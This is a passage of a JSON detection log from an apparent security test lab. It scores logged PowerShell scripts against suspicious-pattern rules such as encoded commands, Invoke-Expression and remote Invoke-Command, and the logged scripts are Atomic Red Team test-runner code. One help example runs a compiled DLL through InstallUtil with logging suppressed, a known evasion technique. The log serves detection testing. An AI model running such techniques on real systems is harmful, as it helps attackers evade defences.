$Name -PassThru\n\n    return $InputArgument\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'EncodedCommand' matched: '-e #'"
    },
    {
      "timestamp": "2024-12-16T20:34:54.46695+00:00",
      "event_id": 35710588,
      "risk_score": 4,
      "detected_patterns": ", InvokeCommand",
      "pattern_details": "InvokeCommand [Score: 4]",
      "command_length": 3474,
      "full_command": "function Invoke-ExecuteCommand ($finalCommand, $executor, $executionPlatform, $TimeoutSeconds, $session = $null, $interactive) {\n    $null = @(\n        if ($null -eq $finalCommand) { return 0 }\n        $finalCommand = $finalCommand.trim()\n        Write-Verbose -Message 'Invoking Atomic Tests using defined executor'\n        if ($executor -eq \"command_prompt\" -or $executor -eq \"sh\" -or $executor -eq \"bash\") {\n            $execPrefix = \"-c\"\n            $execExe = $executor\n            if ($executor -eq \"command_prompt\") {\n                $execPrefix = \"/c\";\n                $execExe = \"cmd.exe\";\n                $execCommand = $finalCommand -replace \"`n\", \" & \"\n                $arguments = $execPrefix, \"$execCommand\"\n            }\n            else {\n                $finalCommand = $finalCommand -replace \"[\\\\](?!;)\", \"`\\$&\"\n                $finalCommand = $finalCommand -replace \"[`\"]\", \"`\\$&\"\n                $execCommand = $finalCommand -replace \"(?<!;)\\n\", \"; \"\n                $arguments = \"$execPrefix `\"$execCommand`\"\"\n\n            }\n        }\n        elseif ($executor -eq \"powershell\") {\n            $execCommand = $finalCommand -replace \"`\"\", \"`\\`\"`\"\"\n            if ($session) {\n                if ($executionPlatform -eq \"windows\") {\n                    $execExe = \"powershell.exe\"\n                }\n                else {\n                    $execExe = \"pwsh\"\n                }\n            }\n            else {\n                $execExe = \"powershell.exe\"; if ($IsLinux -or $IsMacOS) { $execExe = \"pwsh\" }\n            }\n            if ($execExe -eq \"pwsh\") {\n                $arguments = \"-Command $execCommand\"\n            }\n            else {\n                $arguments = \"& {$execCommand}\"\n            }\n        }\n        else {\n            Write-Warning -Message \"Unable to generate or execute the command line properly. Unknown executor\"\n            return [PSCustomObject]@{\n                StandardOutput = \"\"\n                ErrorOutput    = \"\"\n                ExitCode       = -1\n                IsTimeOut      = $false\n            }\n        }\n\n        # Write-Host -ForegroundColor Magenta \"$execExe $arguments\"\n        if ($session) {\n            $scriptParentPath = Split-Path $import -Parent\n            $fp = Join-Path $scriptParentPath \"Invoke-Process.ps1\"\n            $fp2 = Join-Path $scriptParentPath \"Invoke-KillProcessTree.ps1\"\n            invoke-command -Session $session -FilePath $fp\n            invoke-command -Session $session -FilePath $fp2\n            $res = invoke-command -Session $session -ScriptBlock { Invoke-Process -filename $Using:execExe -Arguments $Using:arguments -TimeoutSeconds $Using:TimeoutSeconds -stdoutFile \"art-out.txt\" -stderrFile \"art-err.txt\" }\n        }\n        else {\n            if ($interactive) {\n                # This use case is: Local execution of tests that contain interactive prompts\n                #   In this situation, let the stdout/stderr flow to the console\n                $res = Invoke-Process -filename $execExe -Arguments $arguments -TimeoutSeconds $TimeoutSeconds\n            }\n            else {\n                # Local execution that DO NOT contain interactive prompts\n                #   In this situation, capture the stdout/stderr for Invoke-AtomicTest to send to the caller\n                $res = Invoke-Process -filename $execExe -Arguments $arguments -TimeoutSeconds $TimeoutSeconds -stdoutFile \"art-out.txt\" -stderrFile \"art-err.txt\"\n            }\n        }\n    )\n    $res\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'InvokeCommand' matched: 'invoke-command'\nPattern 'InvokeCommand' matched: 'invoke-command'\nPattern 'InvokeCommand' matched: 'invoke-command'"
    },
    {
      "timestamp": "2024-12-16T20:34:56.1381693+00:00",
      "event_id": 35710918,
      "risk_score": 4,
      "detected_patterns": ", InvokeCommand",
      "pattern_details": "InvokeCommand [Score: 4]",
      "command_length": 3474,
      "full_command": "function Invoke-ExecuteCommand ($finalCommand, $executor, $executionPlatform, $TimeoutSeconds, $session = $null, $interactive) {\n    $null = @(\n        if ($null -eq $finalCommand) { return 0 }\n        $finalCommand = $finalCommand.trim()\n        Write-Verbose -Message 'Invoking Atomic Tests using defined executor'\n        if ($executor -eq \"command_prompt\" -or $executor -eq \"sh\" -or $executor -eq \"bash\") {\n            $execPrefix = \"-c\"\n            $execExe = $executor\n            if ($executor -eq \"command_prompt\") {\n                $execPrefix = \"/c\";\n                $execExe = \"cmd.exe\";\n                $execCommand = $finalCommand -replace \"`n\", \" & \"\n                $arguments = $execPrefix, \"$execCommand\"\n            }\n            else {\n                $finalCommand = $finalCommand -replace \"[\\\\](?!;)\", \"`\\$&\"\n                $finalCommand = $finalCommand -replace \"[`\"]\", \"`\\$&\"\n                $execCommand = $finalCommand -replace \"(?<!;)\\n\", \"; \"\n                $arguments = \"$execPrefix `\"$execCommand`\"\"\n\n            }\n        }\n        elseif ($executor -eq \"powershell\") {\n            $execCommand = $finalCommand -replace \"`\"\", \"`\\`\"`\"\"\n            if ($session) {\n                if ($executionPlatform -eq \"windows\") {\n                    $execExe = \"powershell.exe\"\n                }\n                else {\n                    $execExe = \"pwsh\"\n                }\n            }\n            else {\n                $execExe = \"powershell.exe\"; if ($IsLinux -or $IsMacOS) { $execExe = \"pwsh\" }\n            }\n            if ($execExe -eq \"pwsh\") {\n                $arguments = \"-Command $execCommand\"\n            }\n            else {\n                $arguments = \"& {$execCommand}\"\n            }\n        }\n        else {\n            Write-Warning -Message \"Unable to generate or execute the command line properly. Unknown executor\"\n            return [PSCustomObject]@{\n                StandardOutput = \"\"\n                ErrorOutput    = \"\"\n                ExitCode       = -1\n                IsTimeOut      = $false\n            }\n        }\n\n        # Write-Host -ForegroundColor Magenta \"$execExe $arguments\"\n        if ($session) {\n            $scriptParentPath = Split-Path $import -Parent\n            $fp = Join-Path $scriptParentPath \"Invoke-Process.ps1\"\n            $fp2 = Join-Path $scriptParentPath \"Invoke-KillProcessTree.ps1\"\n            invoke-command -Session $session -FilePath $fp\n            invoke-command -Session $session -FilePath $fp2\n            $res = invoke-command -Session $session -ScriptBlock { Invoke-Process -filename $Using:execExe -Arguments $Using:arguments -TimeoutSeconds $Using:TimeoutSeconds -stdoutFile \"art-out.txt\" -stderrFile \"art-err.txt\" }\n        }\n        else {\n            if ($interactive) {\n                # This use case is: Local execution of tests that contain interactive prompts\n                #   In this situation, let the stdout/stderr flow to the console\n                $res = Invoke-Process -filename $execExe -Arguments $arguments -TimeoutSeconds $TimeoutSeconds\n            }\n            else {\n                # Local execution that DO NOT contain interactive prompts\n                #   In this situation, capture the stdout/stderr for Invoke-AtomicTest to send to the caller\n                $res = Invoke-Process -filename $execExe -Arguments $arguments -TimeoutSeconds $TimeoutSeconds -stdoutFile \"art-out.txt\" -stderrFile \"art-err.txt\"\n            }\n        }\n    )\n    $res\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'InvokeCommand' matched: 'invoke-command'\nPattern 'InvokeCommand' matched: 'invoke-command'\nPattern 'InvokeCommand' matched: 'invoke-command'"
    },
    {
      "timestamp": "2024-12-16T20:34:55.2449476+00:00",
      "event_id": 35710712,
      "risk_score": 4,
      "detected_patterns": ", EncodedCommand",
      "pattern_details": "EncodedCommand [Score: 4]",
      "command_length": 19452,
      "full_command": "# The class definitions that these functions rely upon are located in Private\\AtomicClassSchema.ps1\n\nfunction New-AtomicTechnique {\n    <#\n.SYNOPSIS\n\nSpecifies a new atomic red team technique. The output of this function is designed to be piped directly to ConvertTo-Yaml, eliminating the need to work with YAML directly.\n\n.PARAMETER AttackTechnique\n\nSpecifies one or more MITRE ATT&CK techniques that to which this technique applies. Per MITRE naming convention, an attack technique should start with \"T\" followed by a 4 digit number. The MITRE sub-technique format is also supported: TNNNN.NNN\n\n.PARAMETER DisplayName\n\nSpecifies the name of the technique as defined by ATT&CK. Example: 'Audio Capture'\n\n.PARAMETER AtomicTests\n\nSpecifies one or more atomic tests. Atomic tests are created using the New-AtomicTest function.\n\n.EXAMPLE\n\n$InputArg1 = New-AtomicTestInputArgument -Name filename -Description 'location of the payload' -Type Path -Default 'PathToAtomicsFolder\\T1118\\src\\T1118.dll'\n$InputArg2 = New-AtomicTestInputArgument -Name source -Description 'location of the source code to compile' -Type Path -Default 'PathToAtomicsFolder\\T1118\\src\\T1118.cs'\n\n$AtomicTest1 = New-AtomicTest -Name 'InstallUtil uninstall method call' -Description 'Executes the Uninstall Method' -SupportedPlatforms Windows -InputArguments @($InputArg1, $InputArg2) -ExecutorType CommandPrompt -ExecutorCommand @'\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /target:library /out:#{filename}  #{source}\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U #{filename}\n'@\n\n# Note: the input arguments are identical for atomic test #1 and #2\n$AtomicTest2 = New-AtomicTest -Name 'InstallUtil GetHelp method call' -Description 'Executes the Help property' -SupportedPlatforms Windows -InputArguments @($InputArg1, $InputArg2) -ExecutorType CommandPrompt -ExecutorCommand @'\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /target:library /out:#{filename} #{source}\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /? #{filename}\n'@\n\n$AtomicTechnique = New-AtomicTechnique -AttackTechnique T1118 -DisplayName InstallUtil -AtomicTests $AtomicTest1, $AtomicTest2\n\n# Everything is ready to convert to YAML now!\n$AtomicTechnique | ConvertTo-Yaml | Out-File T1118.yaml\n\n.OUTPUTS\n\nAtomicTechnique\n\nOutputs an object representing an atomic technique.\n\nThe output of New-AtomicTechnique is designed to be piped to ConvertTo-Yaml.\n#>\n\n    [CmdletBinding()]\n    [OutputType([AtomicTechnique])]\n    param (\n        [Parameter(Mandatory)]\n        [String[]]\n        $AttackTechnique,\n\n        [Parameter(Mandatory)]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $DisplayName,\n\n        [Parameter(Mandatory)]\n        [AtomicTest[]]\n        [ValidateNotNull()]\n        $AtomicTests\n    )\n\n    $AtomicTechniqueInstance = [AtomicTechnique]::new()\n\n    foreach ($Technique in $AttackTechnique) {\n        # Attack techniques should match the MITRE ATT&CK [sub-]technique format.\n        # This is not a requirement so just warn the user.\n        if ($Technique -notmatch '^(?-i:T\\d{4}(\\.\\d{3}){0,1})$') {\n            Write-Warning \"The following supplied attack technique does not start with 'T' followed by a four digit number: $Technique\"\n        }\n    }\n\n    $AtomicTechniqueInstance.attack_technique = $AttackTechnique\n    $AtomicTechniqueInstance.display_name = $DisplayName\n    $AtomicTechniqueInstance.atomic_tests = $AtomicTests\n\n    return $AtomicTechniqueInstance\n}\n\nfunction New-AtomicTest {\n    <#\n.SYNOPSIS\n\nSpecifies an atomic test.\n\n.PARAMETER Name\n\nSpecifies the name of the test that indicates how it tests the technique.\n\n.PARAMETER Description\n\nSpecifies a long form description of the test. Markdown is supported.\n\n.PARAMETER SupportedPlatforms\n\nSpecifies the OS/platform on which the test is designed to run. The following platforms are currently supported: Windows, macOS, Linux.\n\nA single test can support multiple platforms.\n\n.PARAMETER ExecutorType\n\nSpecifies the the framework or application in which the test should be executed. The following executor types are currently supported: CommandPrompt, Sh, Bash, PowerShell.\n\n- CommandPrompt: The Windows Command Prompt, aka cmd.exe\n  Requires the -ExecutorCommand argument to contain a multi-line script that will be preprocessed and then executed by cmd.exe.\n\n- PowerShell: PowerShell\n  Requires the -ExecutorCommand argument to contain a multi-line PowerShell scriptblock that will be preprocessed and then executed by powershell.exe\n\n- Sh: Linux's bourne shell\n  Requires the -ExecutorCommand argument to contain a multi-line script that will be preprocessed and then executed by sh.\n\n- Bash: Linux's bourne again shell\n  Requires the -ExecutorCommand argument to contain a multi-line script that will be preprocessed and then executed by bash.\n\n.PARAMETER ExecutorElevationRequired\n\nSpecifies that the test must run with elevated privileges.\n\n.PARAMETER ExecutorSteps\n\nSpecifies a manual list of steps to execute. This should be specified when the atomic test cannot be executed in an automated fashion, for example when GUI steps are involved that cannot be automated.\n\n.PARAMETER ExecutorCommand\n\nSpecifies the command to execute as part of the atomic test. This should be specified when the atomic test can be executed in an automated fashion.\n\nThe -ExecutorType specified will dictate the command specified, e.g. PowerShell scriptblock code when the \"PowerShell\" ExecutorType is specified.\n\n.PARAMETER ExecutorCleanupCommand\n\nSpecifies the command to execute if there are any artifacts that need to be cleaned up.\n\n.PARAMETER InputArguments\n\nSpecifies one or more input arguments. Input arguments are defined using the New-AtomicTestInputArgument function.\n\n.PARAMETER DependencyExecutorType\n\nSpecifies an override execution type for dependencies. By default, dependencies are executed using the framework specified in -ExecutorType.\n\nIn most cases, 'PowerShell' is specified as a dependency executor type when 'CommandPrompt' is specified as an executor type.\n\n.PARAMETER Dependencies\n\nSpecifies one or more dependencies. Dependencies are defined using the New-AtomicTestDependency function.\n\n.EXAMPLE\n\n$InputArg1 = New-AtomicTestInputArgument -Name filename -Description 'location of the payload' -Type Path -Default 'PathToAtomicsFolder\\T1118\\src\\T1118.dll'\n$InputArg2 = New-AtomicTestInputArgument -Name source -Description 'location of the source code to compile' -Type Path -Default 'PathToAtomicsFolder\\T1118\\src\\T1118.cs'\n\n$AtomicTest = New-AtomicTest -Name 'InstallUtil uninstall method call' -Description 'Executes the Uninstall Method' -SupportedPlatforms Windows -InputArguments $InputArg1, $InputArg2 -ExecutorType CommandPrompt -ExecutorCommand @'\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /target:library /out:#{filename}  #{source}\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U #{filename}\n'@\n\n.OUTPUTS\n\nAtomicTest\n\nOutputs an object representing an atomic test. This object is intended to be supplied to the New-AtomicTechnique -AtomicTests parameter.\n\nThe output of New-AtomicTest can be piped to ConvertTo-Yaml. The resulting output can be added to an existing atomic technique YAML doc.\n#>\n\n    [CmdletBinding(DefaultParameterSetName = 'AutomatedExecutor')]\n    [OutputType([AtomicTest])]\n    param (\n        [Parameter(Mandatory)]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $Name,\n\n        [Parameter(Mandatory)]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $Description,\n\n        [Parameter(Mandatory)]\n        [String[]]\n        [ValidateSet('Windows', 'macOS', 'Linux')]\n        $SupportedPlatforms,\n\n        [Parameter(Mandatory, ParameterSetName = 'AutomatedExecutor')]\n        [String]\n        [ValidateSet('CommandPrompt', 'Sh', 'Bash', 'PowerShell')]\n        $ExecutorType,\n\n        [Switch]\n        $ExecutorElevationRequired,\n\n        [Parameter(Mandatory, ParameterSetName = 'ManualExecutor')]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $ExecutorSteps,\n\n        [Parameter(Mandatory, ParameterSetName = 'AutomatedExecutor')]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $ExecutorCommand,\n\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $ExecutorCleanupCommand,\n\n        [AtomicInputArgument[]]\n        $InputArguments,\n\n        [String]\n        [ValidateSet('CommandPrompt', 'Sh', 'Bash', 'PowerShell')]\n        $DependencyExecutorType,\n\n        [AtomicDependency[]]\n        $Dependencies\n    )\n\n    $AtomicTestInstance = [AtomicTest]::new()\n\n    $AtomicTestInstance.name = $Name\n    $AtomicTestInstance.description = $Description\n    $AtomicTestInstance.supported_platforms = $SupportedPlatforms | ForEach-Object { $_.ToLower() }\n\n    $StringsWithPotentialInputArgs = New-Object -TypeName 'System.Collections.Generic.List`1[String]'\n\n    switch ($PSCmdlet.ParameterSetName) {\n        'AutomatedExecutor' {\n            $ExecutorInstance = [AtomicExecutorDefault]::new()\n            $ExecutorInstance.command = $ExecutorCommand\n            $StringsWithPotentialInputArgs.Add($ExecutorCommand)\n        }\n\n        'ManualExecutor' {\n            $ExecutorInstance = [AtomicExecutorManual]::new()\n            $ExecutorInstance.steps = $ExecutorSteps\n            $StringsWithPotentialInputArgs.Add($ExecutorSteps)\n        }\n    }\n\n    switch ($ExecutorType) {\n        'CommandPrompt' { $ExecutorInstance.name = 'command_prompt' }\n        default { $ExecutorInstance.name = $ExecutorType.ToLower() }\n    }\n\n    if ($ExecutorCleanupCommand) {\n        $ExecutorInstance.cleanup_command = $ExecutorCleanupCommand\n        $StringsWithPotentialInputArgs.Add($ExecutorCleanupCommand)\n    }\n\n    if ($ExecutorElevationRequired) { $ExecutorInstance.elevation_required = $True }\n\n    if ($Dependencies) {\n        foreach ($Dependency in $Dependencies) {\n            $StringsWithPotentialInputArgs.Add($Dependency.description)\n            $StringsWithPotentialInputArgs.Add($Dependency.prereq_command)\n            $StringsWithPotentialInputArgs.Add($Dependency.get_prereq_command)\n        }\n    }\n\n    if ($DependencyExecutorType) {\n        switch ($DependencyExecutorType) {\n            'CommandPrompt' { $AtomicTestInstance.dependency_executor_name = 'command_prompt' }\n            default { $AtomicTestInstance.dependency_executor_name = $DependencyExecutorType.ToLower() }\n        }\n    }    $AtomicTestInstance.dependencies = $Dependencies\n\n    [Hashtable] $InputArgHashtable = @{ }\n\n    if ($InputArguments.Count) {\n        # Determine if any of the input argument names repeat. They must be unique.\n        $InputArguments | Group-Object -Property Name | Where-Object { $_.Count -gt 1 } | ForEach-Object {\n            Write-Error \"There are $($_.Count) instances of the $($_.Name) input argument. Input argument names must be unique.\"\n            return\n        }\n\n        # Convert each input argument to a hashtable where the key is the Name property.\n\n        foreach ($InputArg in $InputArguments) {\n            # Create a copy of the passed input argument that doesn't include the \"Name\" property.\n            # Passing in a shallow copy adversely affects YAML serialization for some reason.\n            $NewInputArg = [AtomicInputArgument]::new()\n            $NewInputArg.default = $InputArg.default\n            $NewInputArg.description = $InputArg.description\n            $NewInputArg.type = $InputArg.type\n\n            $InputArgHashtable[$InputArg.Name] = $NewInputArg\n        }\n\n        $AtomicTestInstance.input_arguments = $InputArgHashtable\n    }\n\n    # Extract all specified input arguments from executor and any dependencies.\n    $Regex = [Regex] '#\\{(?<ArgName>[^}]+)\\}'\n    [String[]] $InputArgumentNamesFromExecutor = $StringsWithPotentialInputArgs |\n    ForEach-Object { $Regex.Matches($_) } |\n    Select-Object -ExpandProperty Groups |\n    Where-Object { $_.Name -eq 'ArgName' } |\n    Select-Object -ExpandProperty Value |\n    Sort-Object -Unique\n\n\n    # Validate that all executor arguments are defined as input arguments\n    if ($InputArgumentNamesFromExecutor.Count) {\n        $InputArgumentNamesFromExecutor | ForEach-Object {\n            if ($InputArgHashtable.Keys -notcontains $_) {\n                Write-Error \"The following input argument was specified but is not defined: '$_'\"\n                return\n            }\n        }\n    }\n\n    # Validate that all defined input args are utilized at least once in the executor.\n    if ($InputArgHashtable.Keys.Count) {\n        $InputArgHashtable.Keys | ForEach-Object {\n            if ($InputArgumentNamesFromExecutor -notcontains $_) {\n                # Write a warning since this scenario is not considered a breaking change\n                Write-Warning \"The following input argument is defined but not utilized: '$_'.\"\n            }\n        }\n    }\n\n    $AtomicTestInstance.executor = $ExecutorInstance\n\n    return $AtomicTestInstance\n}\n\nfunction New-AtomicTestDependency {\n    <#\n.SYNOPSIS\n\nSpecifies a new dependency that must be met prior to execution of an atomic test.\n\n.PARAMETER Description\n\nSpecifies a human-readable description of the dependency. This should be worded in the following form: SOMETHING must SOMETHING\n\n.PARAMETER PrereqCommand\n\nSpecifies commands to check if prerequisites for running this test are met.\n\nFor the \"command_prompt\" executor, if any command returns a non-zero exit code, the pre-requisites are not met.\n\nFor the \"powershell\" executor, all commands are run as a script block and the script block must return 0 for success.\n\n.PARAMETER GetPrereqCommand\n\nSpecifies commands to meet this prerequisite or a message describing how to meet this prereq\n\nMore specifically, this command is designed to satisfy either of the following conditions:\n\n1) If a prerequisite is not met, perform steps necessary to satify the prerequisite. Such a command should be implemented when prerequisites can be satisfied in an automated fashion.\n2) If a prerequisite is not met, inform the user what the steps are to satisfy the prerequisite. Such a message should be presented to the user in the case that prerequisites cannot be satisfied in an automated fashion.\n\n.EXAMPLE\n\n$Dependency = New-AtomicTestDependency -Description 'Folder to zip must exist (#{input_file_folder})' -PrereqCommand 'test -e #{input_file_folder}' -GetPrereqCommand 'echo Please set input_file_folder argument to a folder that exists'\n\n.OUTPUTS\n\nAtomicDependency\n\nOutputs an object representing an atomic test dependency. This object is intended to be supplied to the New-AtomicTest -Dependencies parameter.\n\nNote: due to a bug in PowerShell classes, the get_prereq_command property will not display by default. If all fields must be explicitly displayed, they can be viewed by piping output to \"Select-Object description, prereq_command, get_prereq_command\".\n#>\n\n    [CmdletBinding()]\n    [OutputType([AtomicDependency])]\n    param (\n        [Parameter(Mandatory)]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $Description,\n\n        [Parameter(Mandatory)]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $PrereqCommand,\n\n        [Parameter(Mandatory)]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $GetPrereqCommand\n    )\n\n    $DependencyInstance = [AtomicDependency]::new()\n\n    $DependencyInstance.description = $Description\n    $DependencyInstance.prereq_command = $PrereqCommand\n    $DependencyInstance.get_prereq_command = $GetPrereqCommand\n\n    return $DependencyInstance\n}\n\nfunction New-AtomicTestInputArgument {\n    <#\n.SYNOPSIS\n\nSpecifies an input to an atomic test that is a requirement to run the test (think of these like function arguments).\n\n.PARAMETER Name\n\nSpecifies the name of the input argument. This must be lowercase and can optionally, have underscores. The input argument name is what is specified as arguments within executors and dependencies.\n\n.PARAMETER Description\n\nSpecifies a human-readable description of the input argument.\n\n.PARAMETER Type\n\nSpecifies the data type of the input argument. The following data types are supported: Path, Url, String, Integer, Float. If an alternative data type must be supported, use the -TypeOverride parameter.\n\n.PARAMETER TypeOverride\n\nSpecifies an unsupported input argument data type. Specifying this parameter should not be common.\n\n.PARAMETER Default\n\nSpecifies a default value for an input argument if one is not specified via the Invoke-AtomicTest -InputArgs parameter.\n\n.EXAMPLE\n\n$AtomicInputArgument = New-AtomicTestInputArgument -Name 'rar_exe' -Type Path -Description 'The RAR executable from Winrar' -Default '%programfiles%\\WinRAR\\Rar.exe'\n\n.OUTPUTS\n\nAtomicInputArgument\n\nOutputs an object representing an atomic test input argument. This object is intended to be supplied to the New-AtomicTest -InputArguments parameter.\n#>\n\n    [CmdletBinding(DefaultParameterSetName = 'PredefinedType')]\n    [OutputType([AtomicInputArgument])]\n    param (\n        [Parameter(Mandatory)]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $Name,\n\n        [Parameter(Mandatory)]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $Description,\n\n        [Parameter(Mandatory, ParameterSetName = 'PredefinedType')]\n        [String]\n        [ValidateSet('Path', 'Url', 'String', 'Integer', 'Float')]\n        $Type,\n\n        [Parameter(Mandatory, ParameterSetName = 'TypeOverride')]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $TypeOverride,\n\n        [Parameter(Mandatory)]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $Default\n    )\n\n    if ($Name -notmatch '^(?-i:[0-9a-z_]+)$') {\n        Write-Error \"Input argument names must be lowercase and optionally, contain underscores. Input argument name supplied: $Name\"\n        return\n    }\n\n    $AtomicInputArgInstance = [AtomicInputArgument]::new()\n\n    $AtomicInputArgInstance.description = $Description\n    $AtomicInputArgInstance.default = $Default\n\n    if ($Type) {\n        $AtomicInputArgInstance.type = $Type\n\n        # Validate input argument types when it makes sense to do so.\n        switch ($Type) {\n            'Url' {\n                if (-not [Uri]::IsWellFormedUriString($Type, [UriKind]::RelativeOrAbsolute)) {\n                    Write-Warning \"The specified Url is not properly formatted: $Type\"\n                }\n            }\n\n            'Integer' {\n                if (-not [Int]::TryParse($Type, [Ref] $null)) {\n                    Write-Warning \"The specified Int is not properly formatted: $Type\"\n                }\n            }\n\n            'Float' {\n                if (-not [Double]::TryParse($Type, [Ref] $null)) {\n                    Write-Warning \"The specified Float is not properly formatted: $Type\"\n                }\n            }\n\n            # The following supported data types do not make sense to validate:\n            # 'Path' { }\n            # 'String' { }\n        }\n    }\n    else {\n        $AtomicInputArgInstance.type = $TypeOverride\n    }\n\n    # Add Name as a note property since the Name property cannot be defined in the AtomicInputArgument\n    # since it must be stored as a hashtable where the name is the key. Fortunately, ConvertTo-Yaml\n    # won't convert note properties during serialization.\n    $InputArgument = Add-Member -InputObject $AtomicInputArgInstance -MemberType NoteProperty -Name Name -Value $Name -PassThru\n\n    return $InputArgument\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'EncodedCommand' matched: '-e #'"
    },
    {
      "timestamp": "2024-12-16T20:34:57.2120695+00:00",
      "event_id": 35711064,
      "risk_score": 3,
      "detected_patterns": ", IEX, Get",
      "pattern_details": "IEX [Score: 2]; Get [Score: 1]",
      "command_length": 9912,
      "full_command": ". \"$PSScriptRoot\\Invoke-RunnerScheduleMethods.ps1\"\n\nfunction Invoke-AtomicRunner {\n    [CmdletBinding(\n        SupportsShouldProcess = $true,\n        PositionalBinding = $false,\n        ConfirmImpact = 'Medium')]\n    Param(\n        [Parameter(Mandatory = $false)]\n        [switch]\n        $ShowDetails,\n\n        [Parameter(Mandatory = $false)]\n        [switch]\n        $CheckPrereqs,\n\n        [Parameter(Mandatory = $false)]\n        [switch]\n        $GetPrereqs,\n\n        [Parameter(Mandatory = $false)]\n        [switch]\n        $Cleanup,\n\n        [Parameter(Mandatory = $false)]\n        [switch]\n        $ShowDetailsBrief,\n\n        [Parameter(Mandatory = $false)]\n        [String]\n        $LoggingModule,\n\n        [Parameter(Mandatory = $false)]\n        $ListOfAtomics,\n\n        [Parameter(Mandatory = $false)]\n        [switch]\n        $anyOS = $false,\n\n        [parameter(Mandatory = $false)]\n        [ValidateRange(0, [int]::MaxValue)]\n        [int] $PauseBetweenAtomics,\n\n        [parameter(Mandatory = $false)]\n        [switch] $scheduledTaskCleanup,\n\n        [Parameter(Mandatory = $false, ValueFromRemainingArguments = $true)]\n        $OtherArgs\n    )\n    Begin { }\n    Process {\n\n        function Get-GuidFromHostName( $basehostname ) {\n            $guid = [System.Net.Dns]::GetHostName() -replace $($basehostname + \"-\"), \"\"\n\n            if (!$guid) {\n                LogRunnerMsg \"Hostname has not been updated or could not parse out the Guid: \" + $guid\n                return\n            }\n\n            # Confirm hostname contains a guid\n            [regex]$guidRegex = '(?im)^[{(]?[0-9A-F]{8}[-]?(?:[0-9A-F]{4}[-]?){3}[0-9A-F]{12}[)}]?$'\n\n            if ($guid -match $guidRegex) { return $guid } else { return \"\" }\n        }\n\n        function Invoke-AtomicTestFromScheduleRow ($tr) {\n            $theArgs = $tr.InputArgs\n            if ($theArgs.GetType().Name -ne \"Hashtable\") {\n                $tr.InputArgs = ConvertFrom-StringData -StringData $theArgs\n            }\n            $sc = $tr.AtomicsFolder\n            #Run the Test based on if scheduleContext is 'private' or 'public'\n            if (($sc -eq 'public') -or ($null -eq $sc)) {\n                Invoke-AtomicTest $tr.Technique -TestGuids $tr.auto_generated_guid -InputArgs $tr.InputArgs -TimeoutSeconds $tr.TimeoutSeconds -ExecutionLogPath $artConfig.execLogPath -PathToAtomicsFolder $artConfig.PathToPublicAtomicsFolder @htvars -supressPathToAtomicsFolder\n            }\n            elseif ($sc -eq 'private') {\n                Invoke-AtomicTest $tr.Technique -TestGuids $tr.auto_generated_guid -InputArgs $tr.InputArgs -TimeoutSeconds $tr.TimeoutSeconds -ExecutionLogPath $artConfig.execLogPath -PathToAtomicsFolder $artConfig.PathToPrivateAtomicsFolder @htvars -supressPathToAtomicsFolder\n            }\n            if ($timeToPause -gt 0) {\n                Write-Host \"Sleeping for $timeToPause seconds...\"\n                Start-Sleep $timeToPause\n            }\n            elseif ($timeToPause -eq 0) {\n                Write-Host 'Press any key to continue...';\n                $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown');\n            }\n        }\n\n        function Rename-ThisComputer ($tr, $basehostname) {\n            $hash = $tr.auto_generated_guid\n\n            $newHostName = \"$basehostname-$hash\"\n            $shouldRename = $true\n            if ( $newHostName -eq [System.Net.Dns]::GetHostName()) { $shouldRename = $false }\n            if ($artConfig.verbose) { LogRunnerMsg \"Setting hostname to $newHostName\" }\n\n            If (Test-Path $artConfig.stopFile) {\n                LogRunnerMsg \"exiting script because $($artConfig.stopFile) exists\"\n                exit\n            }\n\n            if ($IsLinux) {\n                if ($shouldRename) { Invoke-Expression $(\"hostnamectl set-hostname $newHostName\") }\n                Invoke-Expression $(\"shutdown -r now\")\n            }\n            if ($IsMacOS) {\n                if ($shouldRename) {\n                    Invoke-Expression $(\"/usr/sbin/scutil --set HostName $newHostName\")\n                    Invoke-Expression $(\"/usr/sbin/scutil --set ComputerName $newHostName\")\n                    Invoke-Expression $(\"/usr/sbin/scutil --set LocalHostName $newHostName\")\n                }\n                Invoke-Expression $(\"/sbin/shutdown -r now\")\n            }\n            else {\n                if ($debug) { LogRunnerMsg \"Debug: pretending to rename the computer to $newHostName\"; exit }\n                if (-not $shouldRename) { Restart-Computer -Force }\n                $retry = $true; $count = 0\n                while ($retry) {\n                    Rename-Computer -NewName $newHostName -Force -Restart\n                    Start-Sleep 120; $count = $count + 1\n                    LogRunnerMsg \"Retrying computer rename $count\"\n                    if ($count -gt 60) { $retry = $false }\n                }\n\n                Start-Sleep -seconds 30\n                LogRunnerMsg \"uh oh, still haven't restarted - should never get to 